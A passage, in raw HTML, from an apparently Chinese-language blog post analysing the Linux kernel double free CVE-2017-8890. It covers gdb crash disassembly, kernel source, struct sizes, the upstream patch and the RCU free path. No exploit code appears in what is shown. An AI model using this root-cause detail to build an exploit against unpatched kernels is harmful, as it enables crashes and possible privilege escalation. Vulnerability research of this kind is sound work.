ds:[r14+0x138],eax</span><br><span class="line">   0xffffffff8182f4d5 &lt;ip_mc_leave_src+85&gt;:lea    rdi,[rbx+0x8]</span><br><span class="line">   0xffffffff8182f4d9 &lt;ip_mc_leave_src+89&gt;:mov    esi,0x8</span><br><span class="line">   0xffffffff8182f4de &lt;ip_mc_leave_src+94&gt;:call   0xffffffff810f4a40 &lt;kfree_call_rcu&gt;</span><br><span class="line">   0xffffffff8182f4e3 &lt;ip_mc_leave_src+99&gt;:pop    rbx</span><br><span class="line">   0xffffffff8182f4e4 &lt;ip_mc_leave_src+100&gt;:mov    eax,r13d</span><br><span class="line">   0xffffffff8182f4e7 &lt;ip_mc_leave_src+103&gt;:pop    r12</span><br><span class="line">   0xffffffff8182f4e9 &lt;ip_mc_leave_src+105&gt;:pop    r13</span><br><span class="line">   0xffffffff8182f4eb &lt;ip_mc_leave_src+107&gt;:pop    r14</span><br><span class="line">   0xffffffff8182f4ed &lt;ip_mc_leave_src+109&gt;:pop    rbp</span><br><span class="line">   0xffffffff8182f4ee &lt;ip_mc_leave_src+110&gt;:ret    </span><br><span class="line">   0xffffffff8182f4ef &lt;ip_mc_leave_src+111&gt;:mov    edx,DWORD PTR [rsi+0x14]</span><br><span class="line">   0xffffffff8182f4f2 &lt;ip_mc_leave_src+114&gt;:lea    rsi,[rsi+0x8]</span><br><span class="line">   0xffffffff8182f4f6 &lt;ip_mc_leave_src+118&gt;:xor    r9d,r9d</span><br><span class="line">   0xffffffff8182f4f9 &lt;ip_mc_leave_src+121&gt;:xor    r8d,r8d</span><br><span class="line">   0xffffffff8182f4fc &lt;ip_mc_leave_src+124&gt;:xor    ecx,ecx</span><br><span class="line">   0xffffffff8182f4fe &lt;ip_mc_leave_src+126&gt;:call   0xffffffff8182f110 &lt;ip_mc_del_src&gt;</span><br><span class="line">   0xffffffff8182f503 &lt;ip_mc_leave_src+131&gt;:pop    rbx</span><br><span class="line">   0xffffffff8182f504 &lt;ip_mc_leave_src+132&gt;:pop    r12</span><br><span class="line">   0xffffffff8182f506 &lt;ip_mc_leave_src+134&gt;:pop    r13</span><br><span class="line">   0xffffffff8182f508 &lt;ip_mc_leave_src+136&gt;:pop    r14</span><br><span class="line">   0xffffffff8182f50a &lt;ip_mc_leave_src+138&gt;:pop    rbp</span><br><span class="line">   0xffffffff8182f50b &lt;ip_mc_leave_src+139&gt;:ret</span><br></pre></td></tr></table></figure></p><p>通过打印堆栈和查看源码/分析汇编，我们知道kernel panic的原因是NULL pointer dereference at 0000000000000006。</p><p>关键代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (!psf) &#123;</span><br><span class="line">2151/* any-source empty exclude case */</span><br><span class="line">2152return ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2153iml-&gt;sfmode, 0, NULL, 0);</span><br><span class="line">2154&#125;</span><br><span class="line">2155err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">2156iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, 0);</span><br><span class="line">2157RCU_INIT_POINTER(iml-&gt;sflist, NULL);</span><br><span class="line">2158/* decrease mem now to avoid the memleak warning */</span><br><span class="line">2159atomic_sub(IP_SFLSIZE(psf-&gt;sl_max), &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">=&gt; 0xffffffff8182f4a5 &lt;ip_mc_leave_src+37&gt;:mov    ecx,DWORD PTR [rbx+0x4]---&gt;crash</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gef➤  info registers </span><br><span class="line">rbx            0x2</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ip_mc_leave_src</span><span class="params">(struct sock *sk, struct ip_mc_socklist *iml,</span></span></span><br><span class="line"><span class="function"><span class="params">   struct in_device *in_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// rbx = [rsi+0x18]---&gt;iml-&gt;sflist---&gt;psf</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_sf_socklist</span> *<span class="title">psf</span> = <span class="title">rtnl_dereference</span>(<span class="title">iml</span>-&gt;<span class="title">sflist</span>);</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!psf) &#123; <span class="comment">// ---&gt;test rbx, rbx; je err</span></span><br><span class="line"><span class="keyword">return</span> ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,</span><br><span class="line">iml-&gt;sfmode, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ecx = [rbx+0x4]---&gt;psf-&gt;sl_count</span></span><br><span class="line">err = ip_mc_del_src(in_dev, &amp;iml-&gt;multi.imr_multiaddr.s_addr,iml-&gt;sfmode, psf-&gt;sl_count, psf-&gt;sl_addr, <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_sf_socklist</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sl_max;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sl_count;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">//0x10字节大小的结构体</span></span><br><span class="line">__be32sl_addr[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br></pre></td></tr></table></figure><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>看资料和patch<br><a href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-8890" target="_blank" rel="noopener">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2017-8890</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The inet_csk_clone_lock function in net/ipv4/inet_connection_sock.c in the Linux kernel allows attackers to cause a denial of service (double free) or possibly have unspecified other impact by leveraging use of the accept system call. </span><br><span class="line">An unprivileged local user could use this flaw to induce kernel memory corruption on the system, leading to a crash. Due to the nature of the flaw, privilege escalation cannot be fully ruled out, although we believe it is unlikely.</span><br></pre></td></tr></table></figure></p><p>linux内核的net/ipv4/inet_connection_sock.c文件中的inet_csk_clone_lock函数允许攻击者利用accept system call去触发double free，造成拒绝服务攻击或者其他可能的影响。<br>一个没有特权的本地用户能够使用这个缺陷去触发系统内核内存损坏，导致系统崩溃。</p><p>patch<br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=657831ffc38e30092a2d5f03d385d710eb88b09a" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=657831ffc38e30092a2d5f03d385d710eb88b09a</a><br><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8b485ce69876c65db12ed390e7f9c0d2a64eff2c" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8b485ce69876c65db12ed390e7f9c0d2a64eff2c</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dccp/tcp: do not inherit mc_list from parent</span><br><span class="line">syzkaller found a way to trigger double frees from ip_mc_drop_socket()</span><br><span class="line"></span><br><span class="line">It turns out that leave a copy of parent mc_list at accept() time,</span><br><span class="line">which is very bad.</span><br><span class="line"></span><br><span class="line">Very similar to commit 8b485ce69876 (&quot;tcp: do not inherit</span><br><span class="line">fastopen_req from parent&quot;)</span><br><span class="line"></span><br><span class="line">Initial report from Pray3r, completed by Andrey one.</span><br><span class="line">Thanks a lot to them !</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">diff --git a/net/ipv4/inet_connection_sock.c b/net/ipv4/inet_connection_sock.c</span><br><span class="line">index 5e313c1..1054d33 100644</span><br><span class="line">--- a/net/ipv4/inet_connection_sock.c</span><br><span class="line">+++ b/net/ipv4/inet_connection_sock.c</span><br><span class="line">@@ -794,6 +794,8 @@ struct sock *inet_csk_clone_lock(const struct sock *sk,</span><br><span class="line"> /* listeners have SOCK_RCU_FREE, not the children */</span><br><span class="line"> sock_reset_flag(newsk, SOCK_RCU_FREE);</span><br><span class="line"> </span><br><span class="line">+inet_sk(newsk)-&gt;mc_list = NULL;</span><br><span class="line">+</span><br><span class="line"> newsk-&gt;sk_mark = inet_rsk(req)-&gt;ir_mark;</span><br><span class="line"> atomic64_set(&amp;newsk-&gt;sk_cookie,</span><br><span class="line">      atomic64_read(&amp;inet_rsk(req)-&gt;ir_cookie));</span><br></pre></td></tr></table></figure></p><p>patch前的源码<br><a href="https://elixir.bootlin.com/linux/v4.11.3/source/net/ipv4/inet_connection_sock.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.11.3/source/net/ipv4/inet_connection_sock.c</a><br>dccp/tcp: do not inherit mc_list from parent</p><p><strong>根据patch推测，在parent对象free了之后，由于child对象直接继承parent对象的值，于是又得到了mc_list的地址，在后面再次被free。</strong></p><h3 id="使用understand阅读源码"><a href="#使用understand阅读源码" class="headerlink" title="使用understand阅读源码"></a>使用understand阅读源码</h3><p>使用understand<br>我导入的源码是<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.10.tar.gz" target="_blank" rel="noopener">kernel4.10</a><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-17-033623.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-17-033659.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-17-033710.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-17-033851.png" alt=""><br>然后等它建立好索引后，搜索想看的函数，右键选择call by就可以自动绘制被调用图。</p><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><h4 id="mc-list对象创建"><a href="#mc-list对象创建" class="headerlink" title="mc_list对象创建"></a>mc_list对象创建</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-17-025058.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-18-100222.jpg" alt=""><br>mc_list结构的定义如下，大小为0x30<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct ip_mc_socklist &#123;</span><br><span class="line">struct ip_mc_socklist __rcu *next_rcu;</span><br><span class="line">struct ip_mreqnmulti;</span><br><span class="line">unsigned intsfmode;/* MCAST_&#123;INCLUDE,EXCLUDE&#125; */</span><br><span class="line">struct ip_sf_socklist __rcu*sflist;</span><br><span class="line">struct rcu_headrcu;</span><br><span class="line">&#125;;</span><br><span class="line">struct callback_head &#123;</span><br><span class="line">struct callback_head *next;</span><br><span class="line">void (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(sizeof(void *))));</span><br><span class="line">#define rcu_head callback_head</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b ip_mc_join_group</span><br><span class="line">gef➤  b sock_kmalloc</span><br></pre></td></tr></table></figure><p>然后单步<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180418/m7Bk5Djleb.png?imageslim" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/180418/0Ig78AkLI3.png?imageslim" alt="mark"></p><h4 id="mc-list对象释放"><a href="#mc-list对象释放" class="headerlink" title="mc_list对象释放"></a>mc_list对象释放</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close -&gt; sock_release() -&gt;  inet_release() -&gt;  ip_mc_drop_socket()</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-032150.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *A socket is closing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ip_mc_drop_socket</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span> = <span class="title">inet_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> *<span class="title">iml</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> = <span class="title">sock_net</span>(<span class="title">sk</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inet-&gt;mc_list)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">rtnl_lock();</span><br><span class="line"><span class="keyword">while</span> ((iml = rtnl_dereference(inet-&gt;mc_list)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_device</span> *<span class="title">in_dev</span>;</span></span><br><span class="line"></span><br><span class="line">inet-&gt;mc_list = iml-&gt;next_rcu;</span><br><span class="line">in_dev = inetdev_by_index(net, iml-&gt;multi.imr_ifindex);</span><br><span class="line">(<span class="keyword">void</span>) ip_mc_leave_src(sk, iml, in_dev);</span><br><span class="line"><span class="keyword">if</span> (in_dev)</span><br><span class="line">ip_mc_dec_group(in_dev, iml-&gt;multi.imr_multiaddr.s_addr);</span><br><span class="line"><span class="comment">/* decrease mem now to avoid the memleak warning */</span></span><br><span class="line">atomic_sub(<span class="keyword">sizeof</span>(*iml), &amp;sk-&gt;sk_omem_alloc);</span><br><span class="line">kfree_rcu(iml, rcu);</span><br><span class="line">&#125;</span><br><span class="line">rtnl_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>ip_mc_drop_socket 这个函数导致释放操作,该函数获取到mc_list对象后，最后调用kfree_rcu，该函数并不是真正的释放该对象，而是调用call_rcu将要删除的对象保存起来，并标记或者开始一个宽限期，等到cpu宽限期结束，会触发一个RCU软中断，再进行释放，如果有回调函数func，则进行回调函数处理流程，整个函数调用逻辑为：kfree_rcu -&gt; … -&gt; call_rcu -&gt; … -&gt; invoke_rcu_core -&gt; RCU_SOFTIRQ -&gt; rcu_process_callbacks -&gt; … __rcu_reclaim</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-18-164437.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-18-164545.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b  /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/net/ipv4/igmp.c:2612 </span><br><span class="line">b  /build/linux-hwe-edge-gyUj63/linux-hwe-edge-4.10.0/kernel/rcu/rcu.h:113</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/blog/180418/GC1Ca1GHFJ.png?imageslim" alt="mark"><br><img src="http://onc55v8te.bkt.clouddn.com/blog/180419/1cjbECk5Ck.png?imageslim" alt="mark"></p><h4 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-19-033114.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *inet_csk_clone_lock - clone an inet socket, and lock its clone</span></span><br><span class="line"><span class="comment"> *@sk: the socket to clone</span></span><br><span class="line"><span class="comment"> *@req: request_sock</span></span><br><span class="line"><span class="comment"> *@priority: for allocation (%GFP_KERNEL, %GFP_ATOMIC, etc)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *Caller must unlock socket even in error path (bh_unlock_sock(newsk))</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct sock *<span class="title">inet_csk_clone_lock</span><span class="params">(<span class="keyword">const</span> struct sock *sk,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> struct request_sock *req,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">const</span> <span class="keyword">gfp_t</span> priority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">newsk</span> = <span class="title">sk_clone_lock</span>(<span class="title">sk</span>, <span class="title">priority</span>);</span><span class="comment">//&lt;-----</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newsk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct sock *<span class="title">sk_clone_lock</span><span class="params">(<span class="keyword">const</span> struct sock *sk, <span class="keyword">const</span> <span class="keyword">gfp_t</span> priority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">newsk</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> is_charged = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    newsk = sk_prot_alloc(sk-&gt;sk_prot, priority, sk-&gt;sk_family);</span><br><span class="line">    <span class="keyword">if</span> (newsk != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_filter</span> *<span class="title">filter</span>;</span></span><br><span class="line"></span><br><span class="line">    sock_copy(newsk, sk);<span class="comment">//&lt;-----</span></span><br><span class="line">        ...</span><br><span class="line">        ...</span><br><span class="line">    <span class="keyword">return</span> newsk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copy all fields from osk to nsk but nsk-&gt;sk_refcnt must not change yet,</span></span><br><span class="line"><span class="comment"> * even temporarly, because of RCU lookups. sk_node should also be left as is.</span></span><br><span class="line"><span class="comment"> * We must not copy fields between sk_dontcopy_begin and sk_dontcopy_end</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sock_copy</span><span class="params">(struct sock *nsk, <span class="keyword">const</span> struct sock *osk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_NETWORK</span></span><br><span class="line"><span class="keyword">void</span> *sptr = nsk-&gt;sk_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="built_in">memcpy</span>(nsk, osk, offsetof(struct sock, sk_dontcopy_begin));</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;nsk-&gt;sk_dontcopy_end, &amp;osk-&gt;sk_dontcopy_end,</span><br><span class="line">       osk-&gt;sk_prot-&gt;obj_size - offsetof(struct sock, sk_dontcopy_end));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY_NETWORK</span></span><br><span class="line">nsk-&gt;sk_security = sptr;</span><br><span class="line">security_sk_clone(osk, nsk);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** struct inet_sock - representation of INET sockets</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @sk - ancestor class</span></span><br><span class="line"><span class="comment"> * @pinet6 - pointer to IPv6 control block</span></span><br><span class="line"><span class="comment"> * @inet_daddr - Foreign IPv4 addr</span></span><br><span class="line"><span class="comment"> * @inet_rcv_saddr - Bound local IPv4 addr</span></span><br><span class="line"><span class="comment"> * @inet_dport - Destination port</span></span><br><span class="line"><span class="comment"> * @inet_num - Local port</span></span><br><span class="line"><span class="comment"> * @inet_saddr - Sending source</span></span><br><span class="line"><span class="comment"> * @uc_ttl - Unicast TTL</span></span><br><span class="line"><span class="comment"> * @inet_sport - Source port</span></span><br><span class="line"><span class="comment"> * @inet_id - ID counter for DF pkts</span></span><br><span class="line"><span class="comment"> * @tos - TOS</span></span><br><span class="line"><span class="comment"> * @mc_ttl - Multicasting TTL</span></span><br><span class="line"><span class="comment"> * @is_icsk - is this an inet_connection_sock?</span></span><br><span class="line"><span class="comment"> * @uc_index - Unicast outgoing device index</span></span><br><span class="line"><span class="comment"> * @mc_index - Multicast device index</span></span><br><span class="line"><span class="comment"> * @mc_list - Group array</span></span><br><span class="line"><span class="comment"> * @cork - info to build ip hdr on each ip frag while socket is corked</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> &#123;</span></span><br><span class="line"><span class="comment">/* sk and pinet6 has to be the first two members of inet_sock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span><span class="title">sk</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_IPV6)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipv6_pinfo</span>*<span class="title">pinet6</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Socket demultiplex comparisons on incoming packets. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_daddrsk.__sk_common.skc_daddr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_rcv_saddrsk.__sk_common.skc_rcv_saddr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_dportsk.__sk_common.skc_dport</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inet_numsk.__sk_common.skc_num</span></span><br><span class="line"></span><br><span class="line">__be32inet_saddr;</span><br><span class="line">__s16uc_ttl;</span><br><span class="line">__u16cmsg_flags;</span><br><span class="line">__be16inet_sport;</span><br><span class="line">__u16inet_id;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_options_rcu</span> __<span class="title">rcu</span>*<span class="title">inet_opt</span>;</span></span><br><span class="line"><span class="keyword">int</span>rx_dst_ifindex;</span><br><span class="line">__u8tos;</span><br><span class="line">__u8min_ttl;</span><br><span class="line">__u8mc_ttl;</span><br><span class="line">__u8pmtudisc;</span><br><span class="line">__u8recverr:<span class="number">1</span>,</span><br><span class="line">is_icsk:<span class="number">1</span>,</span><br><span class="line">freebind:<span class="number">1</span>,</span><br><span class="line">hdrincl:<span class="number">1</span>,</span><br><span class="line">mc_loop:<span class="number">1</span>,</span><br><span class="line">transparent:<span class="number">1</span>,</span><br><span class="line">mc_all:<span class="number">1</span>,</span><br><span class="line">nodefrag:<span class="number">1</span>;</span><br><span class="line">__u8bind_address_no_port:<span class="number">1</span>;</span><br><span class="line">__u8rcv_tos;</span><br><span class="line">__u8convert_csum;</span><br><span class="line"><span class="keyword">int</span>uc_index;</span><br><span class="line"><span class="keyword">int</span>mc_index;</span><br><span class="line">__be32mc_addr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_mc_socklist</span> __<span class="title">rcu</span>*<span class="title">mc_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_cork_full</span><span class="title">cork</span>;</span></span><br><span 